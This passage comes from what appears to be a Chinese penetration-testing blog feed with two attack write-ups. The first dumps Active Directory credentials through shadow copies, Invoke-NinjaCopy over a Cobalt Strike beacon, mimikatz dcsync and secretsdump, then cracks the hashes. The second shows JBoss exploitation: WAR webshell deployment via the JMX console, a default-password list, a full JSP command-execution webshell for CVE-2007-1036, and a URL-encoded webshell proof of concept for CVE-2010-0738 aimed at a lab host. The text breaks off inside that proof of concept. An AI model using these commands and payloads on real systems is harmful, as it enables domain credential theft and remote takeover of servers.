class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><p>删除快照</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;delete &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><h1 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h1><blockquote><p>  vssadmin：卷影复制服务管理命令行工具  域环境默认安装 </p></blockquote><ol><li>查询当前系统的快照</li></ol>   <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">vssadmin list shadows</span><br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121121449922.png" alt="image-20240121121449922"></p><ol start="2"><li><p>创建快照</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vssadmin create shadow /<span class="hljs-attribute">for</span>=c:<br></code></pre></td></tr></table></figure><p>  获得Shadow  Copy Volume Name为\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10  </p></li><li><p>访问快照中的文件  </p><p>查看快照列表：</p></li></ol>   <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">vssadmin list shadows</span><br></code></pre></td></tr></table></figure><pre><code class="hljs"> 无法直接访问 \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12 中的文件可通过创建符号链接访问快照中的文件：</code></pre>   <figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">mklink /d c:<span class="hljs-string">\testvsc</span> <span class="hljs-string">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\</span><br></code></pre></td></tr></table></figure><pre><code class="hljs"> 删除符号链接：  </code></pre>   <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">rd</span> c:\testvsc<br></code></pre></td></tr></table></figure><ol start="4"><li><p>复制ntds.dit</p><p>如果不想使用个链接的方式，就可以使用这个方法 </p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit <span class="hljs-name">c</span>:\ntds3.dit<br></code></pre></td></tr></table></figure></li><li><p>删除快照</p></li></ol>   <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vssadmin <span class="hljs-keyword">delete</span> shadows <span class="hljs-regexp">/for=c: /</span>quiet<br></code></pre></td></tr></table></figure><h1 id="NinjaCopy"><a href="#NinjaCopy" class="headerlink" title="NinjaCopy"></a>NinjaCopy</h1><p>  使用 PowerShell 复制 NTDS.dit  &#x2F; Registry Hives，绕过 SACL&#x2F;  DACL &#x2F; File Locks  </p><blockquote><p>  <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">https://raw.githubusercontent.com/PowerShellMaﬁa/PowerSploit/master/Exﬁltration/Invoke-</a>  <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">NinjaCopy.ps1</a>  </p></blockquote><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">NinjaCopy</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">NinjaCopy</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Windows</span>\<span class="hljs-variable">System32</span>\<span class="hljs-variable">config</span>\<span class="hljs-variable">SAM</span> <span class="hljs-operator">-</span><span class="hljs-variable">LocalDestination</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">sam</span><span class="hljs-operator">.</span><span class="hljs-variable">hive</span><br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">NinjaCopy</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Windows</span>\<span class="hljs-variable">System32</span>\<span class="hljs-variable">config</span>\<span class="hljs-variable">SYSTEM</span> <span class="hljs-operator">-</span><span class="hljs-variable">LocalDestination</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">system</span><span class="hljs-operator">.</span><span class="hljs-variable">hive</span><br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">NinjaCopy</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-string">&quot;C:\windows\ntds\ntds.dit&quot;</span> <span class="hljs-operator">-</span><span class="hljs-variable">LocalDestination</span> <span class="hljs-string">&quot;C:\Users\Administrator\Desktop\ntds.dit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121123126491.png" alt="image-20240121123126491"></p><p>cs内存加载</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">beacon&gt; powershell-<span class="hljs-keyword">import</span> C:\Users\MINGY\Desktop\Invoke-NinjaCopy.ps1<br>[*] Tasked beacon <span class="hljs-keyword">to</span> <span class="hljs-keyword">import</span>: C:\Users\MINGY\Desktop\Invoke-NinjaCopy.ps1<br>[+] host <span class="hljs-keyword">called</span> home, sent: <span class="hljs-number">206740</span> bytes<br><br>beacon&gt; powershell Invoke-NinjaCopy -<span class="hljs-type">Path</span> C:\Windows\System32\config\SAM -LocalDestination c:\sam.hive<br>[*] Tasked beacon <span class="hljs-keyword">to</span> run: Invoke-NinjaCopy -<span class="hljs-type">Path</span> C:\Windows\System32\config\SAM -LocalDestination c:\sam.hive<br>[+] host <span class="hljs-keyword">called</span> home, sent: <span class="hljs-number">493</span> bytes<br><br>beacon&gt; powershell Invoke-NinjaCopy -<span class="hljs-type">Path</span> C:\Windows\System32\config\<span class="hljs-keyword">SYSTEM</span> -LocalDestination c:\<span class="hljs-keyword">system</span>.hive<br>[*] Tasked beacon <span class="hljs-keyword">to</span> run: Invoke-NinjaCopy -<span class="hljs-type">Path</span> C:\Windows\System32\config\<span class="hljs-keyword">SYSTEM</span> -LocalDestination c:\<span class="hljs-keyword">system</span>.hive<br>[+] host <span class="hljs-keyword">called</span> home, sent: <span class="hljs-number">509</span> bytes<br><br>beacon&gt; powershell Invoke-NinjaCopy -<span class="hljs-type">Path</span> &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination C:\ntds.dit<br>[*] Tasked beacon <span class="hljs-keyword">to</span> run: Invoke-NinjaCopy -<span class="hljs-type">Path</span> &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination C:\ntds.dit<br>[+] host <span class="hljs-keyword">called</span> home, sent: <span class="hljs-number">481</span> bytes<br></code></pre></td></tr></table></figure><h1 id="解密得到hash"><a href="#解密得到hash" class="headerlink" title="解密得到hash"></a>解密得到hash</h1><h2 id="在线破解"><a href="#在线破解" class="headerlink" title="在线破解"></a>在线破解</h2><p>  在线破解，不用将域控上的ntds.dit文件下载下来，直接在已有的shell上破解。  </p><p>  有一个Cobaltstrike弹回的beacon，就可以在beacon中直接利用mimikatz来破解，前提是要有管理员权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz lsadump::dcsync /domain:mingy.com /all /csv<br></code></pre></td></tr></table></figure><p>  查看单个用户的详细信息  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz lsadump::dcsync <span class="hljs-regexp">/domain:mingy.com /u</span>ser:krbtgt<br></code></pre></td></tr></table></figure><p>  查看所有用户的详细信息  </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz lsadump::lsa /inject<br></code></pre></td></tr></table></figure><h2 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h2><p> 离线破解一般需要两步，首先就是将远端域控的ntds.dit下载到本地，然后再在本地进行破解。  ntds.dit文件一直在被windows系统使用，所以常规的复制下载方法是无法将文件下载到本地的。首先将域控的 NTDS.DIT 和 SYSTEM 文件下载到本地，然后在本地进行破解。</p><h3 id="SecretsDump"><a href="#SecretsDump" class="headerlink" title="SecretsDump"></a>SecretsDump</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># sam<br>secretsdump.exe -sam sam.hiv -<span class="hljs-keyword">security</span> <span class="hljs-keyword">security</span>.hiv -<span class="hljs-keyword">system</span> sys.hiv <span class="hljs-keyword">LOCAL</span><br><br># ntds.dit<br>secretsdump.exe -<span class="hljs-keyword">system</span> <span class="hljs-keyword">system</span>.hive -ntds ntds.dit <span class="hljs-keyword">LOCAL</span><br><br># kali中可以使用impacket-secretsdump命令<br>impacket-secretsdump -<span class="hljs-keyword">system</span> <span class="hljs-keyword">system</span>.hive -ntds ntds.dit <span class="hljs-keyword">LOCAL</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240121124727833.png" alt="image-20240121124727833"></p><h3 id="john-解密hash"><a href="#john-解密hash" class="headerlink" title="john 解密hash"></a>john 解密hash</h3><p>需要将hash放入1 文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">john 1 <span class="hljs-attribute">--format</span>=NT<br></code></pre></td></tr></table></figure><p>NT代表NTML</p><h3 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h3><p>  DSInternals PowerShell模块提供了构建在框架之上的易于使用的cmdlet。主要功能包括离线  ntds.dit文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。  </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 导入DSInternals模块</span><br><span class="hljs-built_in">Import-Module</span> DSInternals<br><br><span class="hljs-comment"># 获取System bootkey</span><br><span class="hljs-variable">$key</span> = <span class="hljs-built_in">Get-Bootkey</span> <span class="hljs-literal">-SystemHivePath</span> <span class="hljs-string">&#x27;C:\SYSTEM&#x27;</span><br><br><span class="hljs-comment"># 获取所有账户信息</span><br><span class="hljs-built_in">Get-ADDBAccount</span> <span class="hljs-literal">-All</span> <span class="hljs-literal">-DBPath</span> <span class="hljs-string">&#x27;C:\ntds.dit&#x27;</span> <span class="hljs-literal">-Bootkey</span> <span class="hljs-variable">$key</span><br></code></pre></td></tr></table></figure><p>导出hashcat</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">$key</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Bootkey</span> <span class="hljs-operator">-</span><span class="hljs-variable">SystemHivePath</span> <span class="hljs-operator">&#x27;</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">SYSTEM</span><span class="hljs-operator">&#x27;</span><br><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ADDBAccount</span> <span class="hljs-operator">-</span><span class="hljs-built_in">All</span> <span class="hljs-operator">-</span><span class="hljs-variable">DBPath</span> <span class="hljs-operator">&#x27;</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">ntds</span><span class="hljs-operator">.</span><span class="hljs-variable">dit</span><span class="hljs-operator">&#x27;</span> <span class="hljs-operator">-</span><span class="hljs-variable">BootKey</span> <span class="hljs-variable">$key</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Format</span><span class="hljs-operator">-</span><span class="hljs-variable">Custom</span> <span class="hljs-operator">-</span><span class="hljs-variable">View</span> <span class="hljs-variable">HashcatNT</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Out</span><span class="hljs-operator">-</span><span class="hljs-built_in">File</span> <span class="hljs-variable">hashes</span><span class="hljs-operator">.</span><span class="hljs-variable">txt</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jboss漏洞</title>
    <link href="/2024/01/14/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/01/14/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这个也是javaee的中间件</p><p>  一个基于J2EE的开放源代码的应用服务器  </p><blockquote><p>  JBoss 是一个管理 EJB 的容器和服务器，但 JBoss 核心服务不包括支持 servlet&#x2F;JSP 的WEB容  器，一般与Tomcat或Jetty绑定使用。Jboss是 Java EE 应用服务器（就像Apache是web服务器一  样），专门用来运行Java EE程序的。  </p></blockquote><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><ol><li><p>未授权访问漏洞</p><blockquote><p>JMX Console未授权访问Getshell  </p><p>Administration Console 弱口令  </p><p>Getshell  CVE-2007-1036 – JMX Console HtmlAdaptor Getshell  </p><p>CVE-2010-0738 – JMX控制台安全验证绕过漏洞  </p></blockquote></li><li><p>反序列化</p><blockquote><p>CVE-2013-4810 – JBoss EJBInvokerServlet 反序列化漏洞<br>CVE-2015-7501 – JBoss JMXInvokerServlet 反序列化漏洞<br>CVE-2017-7504 – JBoss 4.x JBossMQ JMS 反序列化漏洞<br>CVE-2017-12149 – JBosS AS 6.X 反序列化漏洞  </p></blockquote></li><li><p>历史漏洞发现</p><p><a href="https://github.com/GGyao/jbossScan">https://github.com/GGyao/jbossScan</a></p><p><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></p></li></ol><h1 id="JMX-Console-未授权访问漏洞"><a href="#JMX-Console-未授权访问漏洞" class="headerlink" title="JMX Console 未授权访问漏洞"></a>JMX Console 未授权访问漏洞</h1><p>这个看起来很复杂，但是原理很简单</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>  Jboss的webUI界面 <a href="http://ip:port/jmx-console">http://ip:port/jmx-console</a> 未授权访问(或默认密码 admin&#x2F;admin)，可导  致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取 webshell </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114135105053.png" alt="image-20240114135105053"></p><p>这个是未授权访问，但是我们需要进一步利用它</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>前面进入console之后，我们尝试上传我们的webshell<br>这里的webshell肯定还是war包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114135302923.png" alt="image-20240114135302923"></p><p>点进去，找到一个addurl()  string的函数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114135918346.png" alt="image-20240114135918346"></p><p>这个地方填写我们的war包，但是这个是url，所以攻击机需要添加一个http.server</p><p>使用冰蝎创建jsp然后上传到攻击机</p><p>然后开启服务</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114140515846.png" alt="image-20240114140515846"></p><p> 再将url填入进去</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114140615188.png" alt="image-20240114140615188"></p><p>填完了，让其执行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114140653536.png" alt="image-20240114140653536"></p><p>出现了问题，应该是url出问题了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114140746086.png" alt="image-20240114140746086"></p><p>稍微等一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114140819203.png" alt="image-20240114140819203"></p><p>发现已经存在就同意更改</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114140853158.png" alt="image-20240114140853158"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114140906594.png" alt="image-20240114140906594"></p><p>尝试访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114140943034.png" alt="image-20240114140943034"></p><p>冰蝎连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114154514092.png" alt="image-20240114154514092"></p><p>上传不上可以尝试将war改一个名字</p><h1 id="Jboss弱口令Getshell"><a href="#Jboss弱口令Getshell" class="headerlink" title="Jboss弱口令Getshell"></a>Jboss弱口令Getshell</h1><p>JBoss Administration Console存在默认账号密码admin&#x2F;admin，如果Administration  Console可以登录，就可以在后台部署war包getshell  </p><p>常见弱口令：  </p><blockquote><p><strong>admin</strong>&#x2F;<strong>admin</strong><br>jboss&#x2F;<strong>admin</strong><br><strong>admin</strong>&#x2F;jboss<br><strong>admin</strong>&#x2F;123456<br><strong>admin</strong>&#x2F;<strong>password</strong>  </p></blockquote><p>访问8080端口点击Administration Console，使用admin&#x2F;admin进入后台，选择war包进行上传  </p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>  访问 <a href="http://xx.xx.xx.xx/admin-console">http://xx.xx.xx.xx/admin-console</a>  </p><p>或者</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114155740557.png" alt="image-20240114155740557"></p><p>可以尝试爆破，或者多尝试几个弱密码</p><p>进入之后，点击war</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114161114307.png" alt="image-20240114161114307"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114161128719.png" alt="image-20240114161128719"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114161150992.png" alt="image-20240114161150992"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114161225168.png" alt="image-20240114161225168"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114161256051.png" alt="image-20240114161256051"></p><h1 id="CVE-2007-1036"><a href="#CVE-2007-1036" class="headerlink" title="CVE-2007-1036"></a>CVE-2007-1036</h1><p>  JMX Console HtmlAdaptor Getshell  </p><h2 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote><p>此漏洞主要是由于JBoss中&#x2F;jmx-console&#x2F;HtmlAdaptor路径对外开放，并且没有任何身份验证机  制，导致攻击者可以进入到JMX控制台，并在其中执行任何功能。该漏洞利用的是后台中  jboss.admin -&gt; DeploymentFileRepository  -&gt; store()方法，通过向四个参数传入信息，达到上传shell的目的，其中p1传入的是部署的war包名字，p2传入的是上传的文件的文件名，p3传入  的是上传文件的文件格式，p4传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制  整台服务器。但是通过实验发现，p2和p3可以进行文件的拼接，例如p2&#x3D;she，p3&#x3D;ll.jsp。这个时候服务器还是会进行拼接，将shell.jsp传入到指定路径下。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>  jboss4.<strong>x</strong>以下  </p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>  利用后台中jboss.admin  -&gt; DeploymentFileRepository -&gt; store()方法  </p><p>直接上payload</p><blockquote><p><a href="http://xx.xx.xx.xx/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository">http://xx.xx.xx.xx/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114161853903.png" alt="image-20240114161853903"></p><p>找stor()</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114161933840.png" alt="image-20240114161933840"></p><p>将payload对应的填进去</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe">p1   job1.war<br>p2   job1<br>p3   .jsp<br>p4   &lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt; <br>&lt;% <span class="hljs-keyword">String</span> cmd = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>); <span class="hljs-keyword">String</span> output = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>) &#123; <span class="hljs-keyword">String</span> s = <span class="hljs-literal">null</span>; <span class="hljs-keyword">try</span> &#123; Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(p.getInputStream())); <span class="hljs-keyword">while</span>((s = sI.readLine()) != <span class="hljs-literal">null</span>) &#123; output += s +<span class="hljs-string">&quot;\r\n&quot;</span>; &#125; &#125; <span class="hljs-keyword">catch</span>(IOException e) &#123; e.printStackTrace(); &#125; &#125; out.println(output);%&gt;<br></code></pre></td></tr></table></figure><p>之后同意更改</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114163137517.png" alt="image-20240114163137517"></p><p>然后访问<a href="http://xx.xx.xx.xx/job1/job1.jsp">http://xx.xx.xx.xx/job1/job1.jsp</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114163107056.png" alt="image-20240114163107056"></p><h1 id="CVE-2010-0738"><a href="#CVE-2010-0738" class="headerlink" title="CVE-2010-0738"></a>CVE-2010-0738</h1><p>  JMX Console安全验证绕过  </p><h2 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>  利用原理与CVE-2007-1036相同，只不过利用HEAD请求方法绕过GET和POST请求的限制  </p><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>  jboss4.2.0-jboss4.3.0  </p><h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">HEAD</span> <span class="hljs-string">/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodIndex=5&amp;arg0=../jmx-console.war/&amp;arg1=shell&amp;arg2=.jsp&amp;arg3=%3c%25%40%20%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%69%6f%2e%2a%22%20%25%3e%20%0d%0a%3c%25%20%53%74%72%69%6e%67%20%63%6d%64%20%3d%20%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%3b%20%53%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%22%22%3b%20%69%66%28%63%6d%64%20%21%3d%20%6e%75%6c%6c%29%20%7b%20%53%74%72%69%6e%67%20%73%20%3d%20%6e%75%6c%6c%3b%20%74%72%79%20%7b%20%50%72%6f%63%65%73%73%20%70%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%63%6d%64%29%3b%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%73%49%20%3d%20%6e%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%70%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%20%77%68%69%6c%65%28%28%73%20%3d%20%73%49%2e%72%65%61%64%4c%69%6e%65%28%29%29%20%21%3d%20%6e%75%6c%6c%29%20%7b%20%6f%75%74%70%75%74%20%2b%3d%20%73%20%2b%22%5c%72%5c%6e%22%3b%20%7d%20%7d%20%63%61%74%63%68%28%49%4f%45%78%63%65%70%74%69%6f%6e%20%65%29%20%7b%20%65%2e%70%72%69%6e%74%53%74%61%63%6b%54%72%61%63%65%28%29%3b%20%7d%20%7d%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6f%75%74%70%75%74%29%3b%25%3e&amp;arg4=True</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.yijinglab.com:51783<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) 